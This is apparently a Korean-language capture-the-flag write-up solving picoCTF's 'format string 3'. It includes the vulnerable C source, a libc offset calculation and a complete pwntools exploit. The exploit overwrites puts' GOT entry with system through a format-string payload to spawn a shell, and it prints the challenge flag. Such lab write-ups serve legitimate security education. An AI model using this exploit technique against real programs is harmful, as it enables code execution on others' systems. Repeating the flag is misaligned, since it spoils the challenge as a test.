# [format string 3](https://play.picoctf.org/practice/challenge/449?category=6&originalEvent=73&page=1)

**Description**
> This program doesn't contain a win function. How can you win?
<br />

**Source Code:**
```c
#include <stdio.h>

#define MAX_STRINGS 32

char *normal_string = "/bin/sh";

void setup() {
        setvbuf(stdin, NULL, _IONBF, 0);
        setvbuf(stdout, NULL, _IONBF, 0);
        setvbuf(stderr, NULL, _IONBF, 0);
}

void hello() {
        puts("Howdy gamers!");
        printf("Okay I'll be nice. Here's the address of setvbuf in libc: %p\n", &setvbuf);
}

int main() {
        char *all_strings[MAX_STRINGS] = {NULL};
        char buf[1024] = {'\0'};

        setup();
        hello();

        fgets(buf, 1024, stdin);
        printf(buf);

        puts(normal_string);

        return 0;
}
```
<br />

**Binary Protections:**
```yaml
format-string-3: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter./ld-linux-x86-64.so.2,
for GNU/Linux 3.2.0, BuildID[sha1]=54e1c4048a725df868e9a10dc975a46e8d8e5e92, not stripped

[*] '/home/kali/pico/format_string_3/format-string-3'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x3ff000)
    RUNPATH:    b'.'
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```
<br />

## Exploitation
문제에서 제공되는 정보 및 취약점을 취합해보면 다음과 같습니다.
```text
1. setvbuf 주소 제공
2. print(buf) 호출 -> FSB 취약점 발생
3. puts("/bin/sh")
4. Partial RELRO
```
취합된 정보를 토대로 공격 과정을 정리하면, 문제에서 제공되는 `setvbuf`의 주소를 통해 `system`의 실제 주소를 계산할 수 있습니다. 바이너리는 Partial RELRO 상태이므로 GOT 조작이 가능합니다. 또한 `print(buf)` 호출 시 FSB 취약점이 발생합니다. 따라서 해당 취약점을 활용하여 `puts`의 GOT 엔트리를 `system`의 주소로 덮어쓴다면, 이후 `puts(normal_string)` 호출이 `system("/bin/sh")`로 이어져 최종적으로 쉘을 획득할 수 있을 것입니다.
<br />
<br />

### 1. `system` 주소 구하기
```bash
$ readelf -s libc.so.6 | grep "setvbuf"
  1300: 000000000007a3f0   608 FUNC    WEAK   DEFAULT   16 setvbuf@@GLIBC_2.2.5
$ readelf -s libc.so.6 | grep "system"
  1511: 000000000004f760    45 FUNC    WEAK   DEFAULT   16 system@@GLIBC_2.2.5
```
위 오프셋을 가지고 `libc_base`, `system` 주소를 계산할 수 있습니다.

```python
from pwn import *

p = process("./format-string-3")

p.recvuntil(b"0x")

libc_base = int(p.recv(14), 16) - 0x7a3f0
libc_system = libc_base + 0x4f760
log.info(f"libc_base: {libc_base: #x}")
log.info(f"libc_system: {libc_system: #x}")

p.interactive()
```
```bash
$ python3 test.py
[+] Starting local process '/home/kali/pico/format_string_3/format-string-3': pid 1111
[*] libc_base:  0x7f255443a000
[*] libc_system:  0x7f2554489760
[*] Switching to interactive mode
$
```
<br />

### 2. 메모리 유출로 오프셋 구하기
```bash
$ ./format-string-3
Howdy gamers!
Okay I'll be nice. Here's the address of setvbuf in libc: 0x7fad387c23f0
AAAAAAAA%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p
AAAAAAAA0x7fad38920963|0xfbad208b|0x7fffc740cbb0|0x1|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|0x4141414141414141
/bin/sh
```
`AAAAAAAA`의 오프셋은 파이썬으로 자동화하여 다음과 같이 구할 수 있습니다.
```python
data = ("AAAAAAAA0x7fad38920963|0xfbad208b|0x7fffc740cbb0|0x1|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|0x4141414141414141")
data = data.split("|")

target = "0x4141414141414141"

if target in data:
    idx = data.index(target)
    print(f"offset: {idx+1}")
```
```bash
$ python3 test.py
offset: 38
```
<br />

### 3. GOT 덮어쓰기
```yaml
pwndbg> got
Filtering out read-only entries (display them with -r or --show-readonly)

State of the GOT of /home/kali/pico/format_string_3/format-string-3:
GOT protection: Partial RELRO | Found 4 GOT entries passing the filter
[0x404018] puts@GLIBC_2.2.5 -> 0x401030 ◂— endbr64
...
```
pwndbg로 확인할 결과 puts의 got 주소는 0x404018입니다. 획득환 정보를 가지고 페이로드를 작성할 수 있습니다.

```python
from pwn import *

context.arch = "amd64"

p = process("./format-string-3")
# p = remote("rhea.picoctf.net", 51563)

p.recvuntil(b"0x")

libc_base = int(p.recv(14), 16) - 0x7a3f0
libc_system = libc_base + 0x4f760
log.info(f"libc_base: {libc_base: #x}")
log.info(f"libc_system: {libc_system: #x}")

pay = fmtstr_payload(38, {0x404018:libc_system})

p.send(pay)
p.interactive()
```
```bash
$ python3 test.py
[+] Starting local process './format-string-3': pid 1336
[*] libc_base:  0x7f89a0dd4000
[*] libc_system:  0x7f89a0e23760
[*] Switching to interactive mode
$
                                                                                               c                              \x8b         \xf0                      \x01                                                                 \x00                                                                                    \x00aaaaba\x18@@$
$ pwd
/home/kali/pico/format_string_3
```
<br />

## FLAG
```bash
$ python3 test.py
[+] Opening connection to rhea.picoctf.net on port 51563: Done
[*] libc_base:  0x7a9afecb0000
[*] libc_system:  0x7a9afecff760
[*] Switching to interactive mode
$
                                                                                               c                         \x8b                                                                                    \x01                                       \x00      \x00aaaabaa\x18@@$
$ ls
Makefile
artifacts.tar.gz
flag.txt
format-string-3
format-string-3.c
ld-linux-x86-64.so.2
libc.so.6
metadata.json
profile
$ cat flag.txt
picoCTF{G07_G07?_7a2369d3}$
```
